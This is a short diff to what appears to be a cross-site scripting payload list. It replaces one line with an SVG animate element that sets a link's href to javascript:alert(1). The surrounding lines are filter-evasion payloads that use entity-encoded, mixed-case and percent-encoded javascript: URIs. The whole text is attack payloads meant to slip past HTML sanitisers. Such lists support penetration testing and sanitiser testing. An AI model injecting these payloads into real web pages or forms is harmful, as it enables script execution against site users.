@@ -366,7 +366,7 @@ a="get";
 <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
 <A href="javascript%26colon;confirm()">click
 <a href=javascript:alert(1)>click
-<a href=javascript:alert(1)>click 
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a> 
 <a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>
 <a href="javascript:alert(1)">ssss</a>
 <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
